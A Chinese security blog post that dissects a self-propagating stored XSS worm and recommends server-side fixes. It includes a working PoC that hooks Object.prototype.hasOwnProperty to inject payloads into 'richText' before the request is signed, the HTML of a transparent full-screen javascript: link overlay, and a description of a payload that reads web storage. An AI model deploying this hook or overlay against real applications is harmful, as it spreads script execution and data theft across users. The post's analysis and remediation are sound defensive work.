---
title: 从一段 hasOwnProperty Hook 到可传播 Stored XSS：一次前端持久化攻击链分析
author: diudiu-ai
pubDatetime: 2026-08-10T02:56:31Z
featured: false
draft: false
tags:
  - 信息安全
  - 漏洞复现
  - XSS
  - Hook
description: Stored XSS 是漏洞本体，hasOwnProperty Hook 是自动传播机制
---

## 0x01 前言

最近在分析一段 JavaScript 代码时，遇到了一个比较有意思的 XSS 利用思路。

最初看到代码时，一个非常醒目的操作是：

```javascript
const hasOwnProperty = Object.prototype.hasOwnProperty;

Object.prototype.hasOwnProperty = function (prop) {
    // ...
    return hasOwnProperty.apply(this, arguments);
};
```

也就是说，它直接 Hook 了：

```javascript
Object.prototype.hasOwnProperty
```

更值得关注的是，这段代码并没有简单地执行一次 XSS Payload 后结束，而是在等待正常业务代码处理某种特定对象：

```javascript
item.hasOwnProperty("richText")
```

一旦目标对象符合条件，它就修改对象中的 `richText`，植入新的 HTML Payload。

进一步分析发现，这并不是一个单纯的 XSS Payload，而是一条：

```text
初始 JavaScript 执行
        ↓
Hook JavaScript 公共调用路径
        ↓
自动捕获特定业务对象
        ↓
污染 richText
        ↓
利用正常业务保存
        ↓
恶意 HTML 持久化
        ↓
其他用户加载并执行
        ↓
再次建立 Hook
        ↓
继续寻找新的业务对象
```

的传播链。

不过，在完整分析之后，一个更重要的结论也逐渐明确：

> `hasOwnProperty` Hook 并不是漏洞本身，它只是攻击者为了实现自动传播而设计的一种业务对象捕获机制。

真正需要修复的，仍然是 **Stored XSS 的服务端信任边界问题**。

---

# 0x02 漏洞发现

拿到的 JavaScript 最外层是一个立即执行函数：

```javascript
(() => {
    // ...
})();
```

代码首先定义了一个 `transformer()`：

```javascript
window["constructor"]["transformer"] = (data, dummy, step = 4) => {
    if (typeof data === "undefined") return;

    return typeof dummy !== "undefined"
        ? btoa(/* 编码处理 */)
        : new TextDecoder().decode(/* 解码处理 */);
};
```

这个函数实际上是一个简单的可逆混淆器。

编码时，它会：

```text
字符串
 ↓
UTF-8 Bytes
 ↓
每隔固定字节插入一个干扰 Byte
 ↓
Base64
```

解码时再删除这些干扰 Byte。

因此它并不属于密码学意义上的加密，更接近：

```text
Obfuscation
```

目的是隐藏部分关键字符串。

随后代码初始化一个名为 `deathStar` 的变量，里面实际保存的是经过混淆的数据接收地址。

真正让我开始关注这段代码的，是后面的：

```javascript
Object.prototype.hasOwnProperty = function (prop) {
    // ...
};
```

---

# 0x03 Hook `hasOwnProperty`

代码首先保存原始函数：

```javascript
const hasOwnProperty = Object.prototype.hasOwnProperty;
```

然后覆盖：

```javascript
Object.prototype.hasOwnProperty = function (prop) {
    // ...
};
```

这意味着在当前 JavaScript Realm 中，后续大量：

```javascript
obj.hasOwnProperty(...)
```

调用都会首先经过攻击者植入的函数。

但 Payload 并不会无差别修改所有对象。

它会检查：

```javascript
prop === "richText"
```

并进一步判断目标对象：

```javascript
"businessType" in this &&
typeof this.businessType === "string" &&
this.businessType === "ReqSubItemDesignContent"
```

也就是说，攻击者实际上已经知道目标应用的数据模型。

它寻找的是类似：

```javascript
{
    businessType: "ReqSubItemDesignContent",
    richText: "<p>...</p>"
}
```

这样的业务对象。

当正常业务代码执行：

```javascript
item.hasOwnProperty("richText")
```

时：

```text
item
 ↓
Object.prototype.hasOwnProperty
 ↓
攻击者 Hook
 ↓
this === item
```

攻击代码因此自动获得了当前业务对象。

---

# 0x04 为什么不直接修改 `obj.richText`？

分析到这里自然会产生一个问题：

既然攻击者已经获得 JavaScript 执行能力，为什么不直接：

```javascript
obj.richText = payload;
```

而要大费周章 Hook：

```javascript
Object.prototype.hasOwnProperty
```


我尝试直接在web端和抓包去修改richText的内容，前者会直接把特殊字符转为实体字符，而后者在抓到数据包的时候就已经对参数进行验签，这时候我修改richText肯定和签名对不上，所以没办法直接修改obj.richText，只能顺从前端Javascript的处理逻辑，通过hook方式嵌入我们的逻辑，这样就可以在进行签名前就把richText的内容替换成我们想要的。而为了扩大危害性，就需要增加“自动传播”的功能——

如果攻击者明确知道：

```javascript
window.currentItem
```

就是需要污染的对象，那么当然可以：

```javascript
window.currentItem.richText = payload;
```

这是最简单的。

问题是复杂 SPA 中的业务对象可能：

- 是函数内部局部变量；
- 是临时创建的对象；
- 每次业务操作都会重新生成；
- 没有暴露在 `window`；
- 对象引用不断变化；
- 只有执行特定业务流程时才出现。

此时攻击者可能不知道：

```javascript
obj
```

到底在哪里。

Hook 公共调用路径则完全不同：

```text
安装 Hook
   ↓
等待
   ↓
正常业务继续运行
   ↓
某个未来出现的对象
调用 hasOwnProperty("richText")
   ↓
Hook 自动获得 this
   ↓
检查 businessType
   ↓
发现目标业务对象
   ↓
自动修改 richText
```

因此，这里的 Hook 更准确的定位应该是：

> **Business Object Interceptor / Propagation Trigger**

即：

**业务对象自动捕获器 / 传播触发器。**

---

# 0x05 Payload 如何植入 `richText`

当发现目标业务对象后，原始代码会修改：

```javascript
this["richText"]
```

在原有内容前插入一个 `<a>` 标签。

结构大致类似：

```html
<a
    class="may-the-force-be-with-you"
    href="javascript:..."
    style="
        position:fixed;
        top:0;
        left:0;
        width:100vw;
        height:100vh;
        z-index:999999;
        opacity:0;
    ">
</a>
```

然后再拼接原来的：

```javascript
this.richText
```

假设原始内容是：

```html
<p>Hello World</p>
```

最终内存中的业务对象可能变成：

```html
<a href="javascript:..."></a>
<p>Hello World</p>
```

其中这个 `<a>`：

```text
position: fixed
width: 100vw
height: 100vh
z-index: 999999
opacity: 0
```

意味着它：

- 覆盖整个浏览器窗口；
- 位于很高的层级；
- 完全透明；
- 用户视觉上无法发现。

用户点击页面时，就可能触发：

```text
javascript:
```

URI 中的代码。

这也是整条 XSS 执行链中非常关键的一环。

---

# 0x06 为什么 Hook 不容易破坏正常业务？

如果攻击者粗暴地修改：

```javascript
Object.prototype.hasOwnProperty
```

很容易导致应用自身出现异常。

原始代码因此在完成额外逻辑后仍然执行：

```javascript
return hasOwnProperty.apply(this, arguments);
```

也就是说：

```text
正常调用
item.hasOwnProperty("richText")
        ↓
进入攻击 Hook
        ↓
执行额外副作用
修改 item.richText
        ↓
调用原始 hasOwnProperty
        ↓
返回正常结果
```

对于原来的业务代码来说：

```javascript
item.hasOwnProperty("richText")
```

仍然可能正常返回：

```javascript
true
```

业务流程因此继续执行。

这种方式本质上属于：

```text
Side-effect Hook
```

即：

**保持原函数语义，同时附加攻击副作用。**

---

# 0x07 两层去重机制

这段代码还有一个值得关注的设计：它考虑了重复传播问题。

首先是 Hook 本身的去重：

```javascript
if (Object.prototype.hasOwnProperty.hasForce) return;
```

安装完成后：

```javascript
Object.prototype.hasOwnProperty.hasForce = true;
```

防止当前页面重复 Hook。

第二层则是业务数据去重。

代码检查：

```javascript
this.richText.includes("may-the-force-be-with-you")
```

如果已经存在自己的标记，就不再重复植入。

因此可以理解为：

```text
Runtime Infection Marker
hasOwnProperty.hasForce
        ↓
防止重复安装 Hook


Content Infection Marker
may-the-force-be-with-you
        ↓
防止同一个 richText 重复植入
```

这已经明显不是一个普通的：

```javascript
alert(1)
```

式 XSS 测试 Payload。

它考虑的是：

```text
执行
→ 捕获
→ 植入
→ 去重
→ 持久化
→ 下一次执行
```

这样的生命周期。

---

# 0x08 从 Console 执行为什么也能传播？

实验过程中还有一个非常有意思的现象：

**直接在浏览器 DevTools Console 中执行这段 JavaScript，也能够启动传播链。**

原因其实并不复杂。

Console 只是提供了：

```text
第 0 次 JavaScript Execution
```

执行之后：

```javascript
Object.prototype.hasOwnProperty
```

已经被修改。

接下来用户继续正常操作系统：

```text
Console 执行 Payload
        ↓
Hook 已驻留
        ↓
用户继续正常业务操作
        ↓
业务代码处理目标对象
        ↓
item.hasOwnProperty("richText")
        ↓
攻击 Hook 被调用
        ↓
item.richText 被修改
        ↓
业务继续正常运行
        ↓
Save(item)
```

如果保存接口没有重新检查 `richText`，被污染的数据就会跟着正常业务请求进入服务器。

因此真正值得关注的不是：

> “Console 为什么能执行 JavaScript？”

浏览器 Console 本来就可以执行当前页面上下文中的 JavaScript。

真正的问题是：

> **客户端被修改后的业务对象为什么可以跨过服务器信任边界，并成为其他用户能够执行的持久化内容？**

---

# 0x09 从 Console Injection 到 Stored XSS

假设正常业务对象原本为：

```json
{
    "businessType": "ReqSubItemDesignContent",
    "richText": "<p>Hello</p>"
}
```

Hook 执行后变成：

```json
{
    "businessType": "ReqSubItemDesignContent",
    "richText": "<a href=\"javascript:...\">demo</a><p>Hello</p>"
}
```

随后正常业务执行：

```javascript
fetch("/api/save", {
    method: "POST",
    headers: {
        "Content-Type": "application/json"
    },
    body: JSON.stringify(item)
});
```

如果服务器：

```text
接收 richText
    ↓
不 Sanitization
    ↓
直接写数据库
```

那么临时的浏览器内存污染就转化成了：

```text
Persistent Data Pollution
```

另一用户访问：

```text
GET Business Object
        ↓
返回 richText
        ↓
前端使用 innerHTML / v-html / 类似机制
        ↓
浏览器解析恶意 HTML
```

Stored XSS 至此成立。

---

# 0x0A 为什么它具有“传播”能力？

真正有意思的是下一阶段。

假设：

```text
User A
```

的浏览器首先被植入 Hook。

正常业务操作使恶意 `richText` 入库。

随后：

```text
User B
```

打开这份业务数据。

如果 B 的页面渲染恶意 HTML，并最终触发其中的 JavaScript，那么 Payload 又会在 B 的 Origin 上下文执行。

随后：

```text
User B Browser
        ↓
重新安装 Hook
        ↓
等待 User B 正常业务操作
        ↓
发现新的业务对象
        ↓
修改新的 richText
        ↓
正常保存
        ↓
产生新的污染数据
```

因此理论传播链可以表示成：

```text
User A
  │
  │ infected richText
  ▼
Server / Database
  │
  ▼
User B
  │
  │ Hook installed
  │
  │ normal business operation
  ▼
New infected richText
  │
  ▼
Server / Database
  │
  ▼
User C
```

这也是为什么单纯把它理解成：

```text
Self-XSS
```

并不完整。

如果 Console 是唯一入口，那么最开始确实类似 Self-XSS。

但是一旦：

```text
Console
→ Client Object
→ Server Persistence
→ Other User
```

成立，安全边界已经发生变化。

---

# 0x0B 原始 Payload 中的数据访问

原始代码中还存在对：

```javascript
sessionStorage
```

和：

```javascript
localStorage
```

的读取。

这意味着如果应用将：

```text
Access Token
JWT
用户信息
租户信息
业务状态
```

等敏感信息存储在 Web Storage 中，那么成功执行的 XSS 可能进一步访问这些数据。

出于安全原因，本文复现部分不会使用原始数据外传逻辑，而只使用：

```javascript
alert()
```

作为执行成功标志。

这已经足够证明漏洞是否存在。

---

# 0x0C 漏洞本质到底是什么？

分析到这里，需要区分两个概念。

## 漏洞本体

```text
Stored XSS
```

## 利用/传播技术

```text
Object.prototype.hasOwnProperty Hook
```

换句话说：

```text
Hook
 ↓
自动捕获业务对象
 ↓
自动修改 richText
 ↓
──────── Trust Boundary ────────
 ↓
Server 接受危险 HTML
 ↓
持久化
 ↓
其他用户危险渲染
 ↓
Stored XSS
```

如果只修：

```javascript
item.hasOwnProperty("richText")
```

例如改成：

```javascript
Object.hasOwn(item, "richText")
```

确实可以让这一条具体 Hook 路径失效。

但这并没有解决 Stored XSS。

因为攻击者仍然可以：

```javascript
obj.richText = payload;
```

然后正常保存。

所以：

> **修 Hook 只能杀死当前 PoC，修服务端信任边界才能杀死漏洞。**

---

# 0x0D 复现实验一：Direct Mutation

为了证明这一点，可以首先完全不用 Hook。

假设当前页面存在：

```javascript
window.businessObject = {
    businessType: "ReqSubItemDesignContent",
    richText: "<p>Hello</p>"
};
```

使用无害 Payload：

```javascript
const payload =
    `<a href="javascript:alert('Stored XSS triggered')">
        Stored XSS Demo
     </a>`;
```

直接：

```javascript
window.businessObject.richText =
    payload + window.businessObject.richText;
```

然后不执行任何额外攻击逻辑，只点击系统原本的：

```text
保存
```

按钮。

观察 Network：

```http
POST /api/save
Content-Type: application/json
```

请求体：

```json
{
    "businessType": "ReqSubItemDesignContent",
    "richText": "<a href=\"javascript:alert('Stored XSS triggered')\">Stored XSS Demo</a><p>Hello</p>"
}
```

如果服务器原样保存，再由另一个页面加载：

```text
Victim Browser
      ↓
Render richText as HTML
      ↓
点击链接
      ↓
alert()
```

那么已经证明：

> **即使没有 `hasOwnProperty` Hook，Stored XSS 仍然成立。**

---

# 0x0E 复现实验二：Hook Propagation

第二组实验才加入 Hook。

为了安全演示，只使用无害 Payload：

```javascript
(() => {
    const original = Object.prototype.hasOwnProperty;

    Object.prototype.hasOwnProperty = function (prop) {

        if (
            prop === "richText" &&
            this &&
            this.businessType ===
                "ReqSubItemDesignContent" &&
            typeof this.richText === "string" &&
            !this.richText.includes("xss-demo-marker")
        ) {

            this.richText =
                `<a class="xss-demo-marker"
                    href="javascript:alert('Stored XSS demo')">
                    Demo
                 </a>` +
                this.richText;
        }

        return original.apply(this, arguments);
    };
})();
```

此时不要直接修改业务对象。

执行 Hook 后：

```text
richText
仍然是正常内容
```

然后点击正常业务按钮。

假设业务代码：

```javascript
const item = businessObject;

if (item.hasOwnProperty("richText")) {
    // normal business logic
}
```

调用发生时：

```text
Normal Business
      ↓
item.hasOwnProperty("richText")
      ↓
Hook
      ↓
this === item
      ↓
businessType 匹配
      ↓
自动修改 this.richText
```

此时再观察业务对象：

```javascript
console.log(item.richText);
```

即可看到 Payload 已经被自动植入。

然后继续点击：

```text
正常保存
```

即可形成与实验一相同的 Stored XSS。

这证明：

> **Hook 的作用不是创造 XSS，而是自动寻找未来经过业务流程的对象，并将一次 JavaScript 执行转化成自动植入机制。**

---

# 0x0F 复现实验三：Server-fixed

第三个实验用于证明真正的修复位置。

即使攻击者直接执行：

```javascript
obj.richText = payload;
```

我们也不阻止。

浏览器 Network 请求甚至仍然可以包含：

```json
{
    "richText": "<a href=\"javascript:alert(1)\">demo</a>"
}
```

关键在于服务器收到之后：

```text
Untrusted richText
       ↓
HTML Allowlist Sanitizer
       ↓
Safe richText
       ↓
Database
```

例如：

```html
<a href="javascript:alert(1)">demo</a>
```

最终可能被处理为：

```html
<a>demo</a>
```

然后 Victim Browser 加载：

```text
数据库
 ↓
Safe HTML
 ↓
Renderer
 ↓
无法执行 JavaScript
```

此时即使：

```text
Console Injection
成功

Object Hook
成功

Client Object Mutation
成功
```

传播链仍然失败。

因为攻击数据无法跨过：

```text
Server Trust Boundary
```

---

# 0x10 三组实验对照

最终可以得到非常清晰的对照：

| 实验 | 客户端修改 | Hook | Server Sanitization | Stored XSS |
|---|---|---|---|---|
| Direct Mutation | 是 | 否 | 否 | 成功 |
| Hook Propagation | 自动 | 是 | 否 | 成功 |
| Server-fixed | 是 | 可有可无 | 是 | 失败 |

因此：

```text
Direct Mutation
证明：
Hook 不是漏洞根因


Hook Propagation
证明：
Hook 是自动传播机制


Server-fixed
证明：
服务端 Sanitization 才是关键安全边界
```

---

# 0x11 修复方案

## 1. 服务端对 `richText` 做 HTML Allowlist Sanitization

这是最高优先级。

服务器不能认为：

```text
这是我们自己前端生成的对象
```

所以：

```text
它是可信的
```

这是错误的安全模型。

正确模型应该是：

```text
Browser
=
Attacker Controlled
```

因此：

```text
Browser Object
     ↓
HTTP Request
     ↓
Server
     ↓
Validate
Sanitize
Authorize
     ↓
Persist
```

富文本建议采用成熟 HTML Sanitizer，并使用白名单模型。

例如只允许：

```text
p
br
strong
em
ul
ol
li
blockquote
a
```

对于 `<a>`：

```text
href
title
target
rel
```

可以允许。

但 URL Scheme 只允许：

```text
http:
https:
mailto:
```

绝不能允许：

```text
javascript:
vbscript:
```

以及未经业务确认的危险 `data:` 内容。

---

## 2. 不要使用正则表达式自己过滤 XSS

例如：

```javascript
html.replace(/javascript:/gi, "")
```

不是可靠的 XSS 修复。

HTML、URL、字符编码和浏览器解析存在大量边界情况。

应该使用成熟的：

```text
HTML Parser
+
Allowlist Sanitizer
```

---

## 3. 输出阶段再次 Sanitization

不能只处理新数据。

因为数据库中可能已经存在历史污染：

```text
Old Malicious richText
```

因此：

```text
Input Sanitization
+
Output Sanitization
```

可以作为迁移阶段的双保险。

同时应该离线扫描并清洗历史数据库。

---

## 4. 清理历史污染数据

可以优先搜索当前 Payload 的 IOC，例如：

```text
may-the-force-be-with-you
mayTheForceBeWithYou
executeOrder66
deathStar
javascript:
```

但不能只依赖固定字符串。

因为攻击者完全可以修改：

```text
class name
function name
variable name
```

更重要的是扫描：

```text
javascript: URI
事件属性 on*
危险 iframe/object/embed
异常可执行 SVG
其他危险 HTML
```

---

## 5. CSP 作为纵深防御

建议配置严格 CSP。

例如：

```http
Content-Security-Policy:
    default-src 'self';
    script-src 'self';
    object-src 'none';
    base-uri 'self';
    connect-src 'self';
```

尤其应该尽量避免：

```text
'unsafe-inline'
'unsafe-eval'
```

原始 Payload 中存在动态构造函数的行为，因此：

```text
unsafe-eval
```

会显著降低 CSP 的保护能力。

同时：

```text
connect-src
```

应该限制到明确业务域名。

这样即使 XSS 执行成功，也可以进一步限制任意网络请求。

---

## 6. 敏感 Token 不应长期存放在 Web Storage

如果：

```text
Access Token
Refresh Token
JWT
```

长期存在：

```javascript
localStorage
```

或：

```javascript
sessionStorage
```

那么 XSS 成功后风险会明显扩大。

对于适合 Cookie 模型的认证系统，应考虑：

```text
HttpOnly
Secure
SameSite
```

Cookie。

Access Token 也应尽可能：

```text
短生命周期
+
减少持久化
```

但必须强调：

> Token 存储调整只是降低 XSS 后果，不能替代 XSS 修复。

---

# 0x12 `Object.hasOwn()` 是否值得改？

值得，但应该正确理解它的位置。

原来的：

```javascript
item.hasOwnProperty("richText")
```

可以考虑改成：

```javascript
Object.hasOwn(item, "richText")
```

这可以降低：

```text
Object.prototype.hasOwnProperty
```

被 Monkey Patch 后影响正常业务的风险。

但它属于：

```text
Hardening
```

而不是：

```text
Root Fix
```

因为如果攻击者已经获得页面 JavaScript 执行能力，他仍然可能通过其他方式修改：

```javascript
item.richText
```

所以不能因为：

```text
当前 PoC 不再工作
```

就认为：

```text
Stored XSS 已修复
```

---

# 0x13 修复验收方法

修复后最重要的测试不是重新运行原 PoC。

应该采用更强的攻击假设：

> **假设攻击者已经完全控制浏览器发送给服务器的 `richText`。**

直接向保存接口提交包含危险 HTML 的数据。

例如无害测试：

```html
<a href="javascript:alert('xss-test')">
    test
</a>
```

检查：

```text
HTTP Request
        ↓
允许包含测试 Payload

Server
        ↓
Sanitization

Database
        ↓
不得保留可执行 javascript:

Victim Renderer
        ↓
不得执行 JavaScript
```

只有做到这一点，才能证明：

```text
Direct Mutation
Hook Propagation
其他客户端篡改
```

都无法突破服务器边界。

---

# 0x14 一个容易走偏的修复方向

不要把：

```text
禁止 F12
禁止右键
检测 DevTools
阻止 Console Paste
```

作为漏洞修复。

Console 在这个案例中只是：

```text
Initial JavaScript Execution Primitive
```

真正的问题发生在：

```text
Client
   ↓
Server Trust Boundary
   ↓
Persistence
   ↓
Other User
```

即使没有 Console，攻击者未来如果通过其他 XSS、第三方脚本供应链、恶意扩展或其他 JavaScript 执行入口获得同等能力，问题仍然存在。

---

# 0x15 最终攻击链

整个案例最终可以抽象成：

```text
        Initial JS Execution
                │
                ▼
      Install Propagation Hook
                │
                ▼
 Object.prototype.hasOwnProperty
                │
                ▼
      Normal Business Workflow
                │
                ▼
 item.hasOwnProperty("richText")
                │
                ▼
      Capture Business Object
                │
                ▼
         Modify richText
                │
                ▼
          Normal Save
                │
                ▼
        ┌───────────────┐
        │ SERVER BOUNDARY│
        └───────┬───────┘
                │
         No Sanitization
                │
                ▼
             Database
                │
                ▼
         Victim Loads Data
                │
                ▼
        Unsafe HTML Render
                │
                ▼
           Stored XSS
                │
                ▼
        Install Hook Again
                │
                ▼
       Next Business Object
```

其中最重要的安全边界并不是：

```text
hasOwnProperty
```

而是：

```text
        Browser
           │
           │ untrusted data
           ▼
    ┌──────────────┐
    │    Server    │
    │ Trust Boundary│
    └──────┬───────┘
           │
     Sanitize Here
           │
           ▼
        Database
```

---

# 0x16 总结

这次分析最初看起来是在研究一个：

```javascript
Object.prototype.hasOwnProperty
```

Hook。

但继续向下分析后可以发现，真正值得关注的是它背后的攻击思路。

攻击者并不是简单：

```text
执行一次 XSS
```

而是在尝试：

```text
一次 JS Execution
        ↓
建立长期 Runtime Hook
        ↓
等待正常业务
        ↓
自动发现目标业务对象
        ↓
污染业务数据
        ↓
借正常保存实现持久化
        ↓
借其他用户加载再次执行
        ↓
重新建立 Hook
```

因此：

> Hook `hasOwnProperty` 的价值在于绕过参数签名和自动捕获未来出现的业务对象，从而提供传播能力。

但是，从防御角度看，这个复杂的传播设计反而揭示了一个非常简单的安全原则：

> **永远不要信任浏览器中的业务对象。**

无论对象来自：

```text
React
Vue
Angular
原生 JavaScript
合法业务代码
```

服务器收到它时都应该假设：

```text
Attacker Controlled
```

因此最终结论可以归纳成一句话：

> **漏洞本体是 Stored XSS；`Object.prototype.hasOwnProperty` Hook 是将一次 JavaScript 执行转化为自动业务对象污染和后续传播的利用技术；真正的根修复是在服务端持久化边界对 `richText` 等富文本执行严格的 HTML Allowlist Sanitization，并确保输出端不存在危险 HTML 执行路径。**

当服务端真正守住这个边界以后，即使攻击者已经能够：

```text
修改 obj.richText
Hook hasOwnProperty
修改页面 JavaScript 状态
构造任意客户端请求
```

最终得到的也只是一份：

```text
Untrusted Input
```

而不是一条能够跨用户传播的 Stored XSS 链。

这才是这个案例最值得关注的地方。